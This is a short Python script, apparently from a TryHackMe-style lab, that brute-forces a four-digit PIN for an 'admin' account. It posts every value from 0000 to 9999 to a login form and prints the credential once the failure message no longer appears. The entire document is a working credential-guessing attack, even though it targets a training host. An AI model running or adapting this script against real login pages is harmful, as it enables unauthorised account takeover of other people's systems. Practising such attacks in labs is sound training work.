from requests import Session

url = 'http://python.thm/labs/lab1/'
session = Session()
username = 'admin'

def brute_force(length_of_pin):
    for i in range(10000):
        password = str(i).zfill(length_of_pin)
        data = {"username": username, "password": password}
        response = session.post(url=url,data=data)
        if 'Please try again.' not in response.text:
            print(f"Password found: {username}:{password}")
            return

brute_force(4)
